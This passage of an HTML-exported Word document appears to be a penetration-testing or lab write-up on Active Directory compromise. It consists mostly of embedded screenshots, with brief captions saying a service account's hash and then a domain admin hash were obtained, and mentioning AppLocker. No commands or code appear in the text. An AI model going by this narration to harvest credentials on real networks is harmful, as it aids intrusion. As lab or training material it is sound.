 height:346.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image052.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=639 height=462
src="test_files/image053.jpg" v:shapes="Picture_x0020_74"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>Now we have <span class=SpellE><b><span lang=EN-IN
style='mso-ansi-language:EN-IN'>svcadmin</span></b></span> user account <span
class=GramE>hash.(</span>member of domain admin).<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_73" o:spid="_x0000_i1047" type="#_x0000_t75" style='width:866.25pt;
 height:248.25pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image054.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1155 height=331
src="test_files/image055.jpg" v:shapes="Picture_x0020_73"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>Got domain admin hash<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_72" o:spid="_x0000_i1046" type="#_x0000_t75" style='width:968.25pt;
 height:143.25pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image056.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1291 height=191
src="test_files/image057.jpg" v:shapes="Picture_x0020_72"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_71" o:spid="_x0000_i1045" type="#_x0000_t75" style='width:792.75pt;
 height:102pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image058.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1057 height=136
src="test_files/image059.jpg" v:shapes="Picture_x0020_71"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_70" o:spid="_x0000_i1044" type="#_x0000_t75" style='width:1004.25pt;
 height:533.25pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image060.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1339 height=711
src="test_files/image060.png" v:shapes="Picture_x0020_70"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_69" o:spid="_x0000_i1043" type="#_x0000_t75" alt="A computer screen with white text&#10;&#10;Description automatically generated"
 style='width:1093.5pt;height:361.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image061.png" o:title="A computer screen with white text&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1458 height=482
src="test_files/image061.png"
alt="A computer screen with white text&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_69"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_68" o:spid="_x0000_i1042" type="#_x0000_t75" style='width:859.5pt;
 height:73.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image062.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1146 height=98
src="test_files/image062.png" v:shapes="Picture_x0020_68"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_67" o:spid="_x0000_i1041" type="#_x0000_t75" alt="A computer screen with white text&#10;&#10;Description automatically generated"
 style='width:1092pt;height:290.25pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image063.png" o:title="A computer screen with white text&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1456 height=387
src="test_files/image063.png"
alt="A computer screen with white text&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_67"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_66" o:spid="_x0000_i1040" type="#_x0000_t75" alt="A screen shot of a computer program&#10;&#10;Description automatically generated"
 style='width:1098pt;height:384pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image064.png" o:title="A screen shot of a computer program&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1464 height=512
src="test_files/image064.png"
alt="A screen shot of a computer program&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_66"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_65" o:spid="_x0000_i1039" type="#_x0000_t75" style='width:783pt;
 height:324pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image065.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1044 height=432
src="test_files/image065.png" v:shapes="Picture_x0020_65"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_64" o:spid="_x0000_i1038" type="#_x0000_t75" style='width:1094.25pt;
 height:57pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image066.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1459 height=76
src="test_files/image066.png" v:shapes="Picture_x0020_64"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_63" o:spid="_x0000_i1037" type="#_x0000_t75" style='width:435.75pt;
 height:342pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image067.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=581 height=456
src="test_files/image067.png" v:shapes="Picture_x0020_63"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span class=SpellE>Svcadmin</span> is domain admin
privileges <o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_62" o:spid="_x0000_i1036" type="#_x0000_t75" alt="A diagram with writing on it&#10;&#10;Description automatically generated"
 style='width:744.75pt;height:354.75pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image068.png" o:title="A diagram with writing on it&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=993 height=473
src="test_files/image068.png"
alt="A diagram with writing on it&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_62"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_61" o:spid="_x0000_i1035" type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
 style='width:687pt;height:135pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image069.png" o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=916 height=180
src="test_files/image069.png"
alt="A screenshot of a computer&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_61"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_60" o:spid="_x0000_i1034" type="#_x0000_t75" style='width:974.25pt;
 height:238.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image070.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1299 height=318
src="test_files/image070.png" v:shapes="Picture_x0020_60"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><span style='mso-spacerun:yes'> </span><o:p></o:p></p>

<p class=MsoNormal>AppLocker or windows defender application control. <o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_59" o:spid="_x0000_i1033" type="#_x0000_t75" style='width:768pt;
 height:1in;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image071.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1024 height=96
src="test_files/image071.png" v:shapes="Picture_x0020_59"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_58" o:spid="_x0000_i1032" type="#_x0000_t75" alt="A screen shot of a computer&#10;&#10;Description automatically generated"
 style='width:1008.75pt;height:135pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image072.png" o:title="A screen shot of a computer&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1345 height=180
src="test_files/image072.png"
alt="A screen shot of a computer&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_58"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_57" o:spid="_x0000_i1031" type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
 style='width:1002pt;height:348.75pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image073.png" o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1336 height=465
src="test_files/image073.png"
alt="A screenshot of a computer&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_57"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_56" o:spid="_x0000_i1030" type="#_x0000_t75" alt="A computer code on a black background&#10;&#10;Description automatically generated"
 style='width:1069.5pt;height:135pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image074.png" o:title="A computer code on a black background&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1426 height=180
src="test_files/image074.png"
alt="A computer code on a black background&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_56"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_55" o:spid="_x0000_i1029" type="#_x0000_t75" style='width:1020pt;
 height:100.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image075.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1360 height=134
src="test_files/image075.png" v:shapes="Picture_x0020_55"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_54" o:spid="_x0000_i1028" type="#_x0000_t75" style='width:915.75pt;
 height:490.5pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image076.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1221 height=654
src="test_files/image076.png" v:shapes="Picture_x0020_54"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_53" o:spid="_x0000_i1027" type="#_x0000_t75" alt="A computer screen with text on it&#10;&#10;Description automatically generated"
 style='width:1119pt;height:228pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image077.png" o:title="A computer screen with text on it&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1492 height=304
src="test_files/image077.png"
alt="A computer screen with text on it&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_53"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_52" o:spid="_x0000_i1026" type="#_x0000_t75" style='width:884.25pt;
 height:597pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image078.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1179 height=796
src="test_files/image078.png" v:shapes="Picture_x0020_52"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal>&nbsp;<o:p></o:p></p>

<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shape
 id="Picture_x0020_51" o:spid="_x0000_i1025" type="#_x0000_t75" alt="A computer screen with white text&#10;&#10;Description automatically generated"
 style='width:922.5pt;height:129.75pt;visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="test_files/image079.png" o:title="A computer screen with white text&#10;&#10;Description automatically generated"/>
</v:shape><![endif]--><![if !vml]><img border=0 width=1230 height=173
src="test_files/image079.png"
alt="A computer screen with white text&#10;&#10;Description automatically generated"
v:shapes="Picture_x0020_51"><![endif]></span><o:p></o:p></p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

</div>

</body>

</html>
